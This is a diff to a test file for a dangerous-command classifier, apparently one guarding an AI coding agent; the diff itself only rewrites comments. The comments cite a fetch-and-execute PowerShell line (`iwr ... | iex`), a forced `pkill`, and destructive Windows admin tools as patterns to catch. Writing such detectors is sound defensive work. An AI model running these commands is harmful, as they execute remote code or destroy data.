@@ -1263,11 +1263,9 @@ describe("Windows: PowerShell execution cmdlets", () => {
 	/**
 	 * Running a string as code, and running code that was fetched.
 	 *
-	 * Codex's `windows_dangerous_commands.rs` has none of these rules — its
-	 * PowerShell rules are the URL/launcher pair and the forced delete, and
-	 * nothing else — so this is a divergence from the file this classifier is
-	 * ported from, and not a port of it. `iwr https://example.com/x.ps1 | iex`
-	 * was `null` before.
+	 * This whole group is an addition rather than an inheritance: the rules that
+	 * existed here before it were the URL/launcher pair and the forced delete,
+	 * and nothing else. `iwr https://example.com/x.ps1 | iex` was `null`.
 	 *
 	 * `Invoke-Expr` is the row that is not a catch of a real command. PowerShell
 	 * never abbreviates a cmdlet *name* — measured: `Remove-It` and `Invoke-Ex`
@@ -1375,9 +1373,9 @@ describe("Windows: ShellExecute-shaped launches", () => {
 /**
  * Windows administrative programs.
  *
- * None of these is in Codex's table; the whole group is new. What was measured
- * is that each program exists on this machine under the spelling matched here
- * and accepts the switch form written against it — `format`, `diskpart`, `reg`,
+ * The whole group is new. What was measured is that each program exists on
+ * this machine under the spelling matched here and accepts the switch form
+ * written against it — `format`, `diskpart`, `reg`,
  * `taskkill`, `vssadmin`, `bcdedit`, `schtasks`, `net`, `sc`, `cipher`,
  * `takeown`, `icacls`, `wevtutil`, `bitsadmin` and `netsh`, all in
  * `C:\Windows\System32`, `format` as a `.com` and the rest as `.exe`.
@@ -2118,9 +2116,9 @@ describe("POSIX: ending processes, stopping services, powering off", () => {
 	/**
 	 * `pkill` is the analogue of the Windows `Stop-Process` rule, which is why the
 	 * forced form is the one caught. `pkill` is not a binary on this machine at
-	 * all — `type -a pkill` reports a shell *function* from the Claude Code
-	 * wrapper — so these spellings come from POSIX rather than from what this box
-	 * happens to have installed.
+	 * all — `type -a pkill` reports a shell *function*, not a file in `PATH` — so
+	 * these spellings come from POSIX rather than from what this box happens to
+	 * have installed.
 	 */
 	test.each([
 		["pkill -9 node", "by name"],
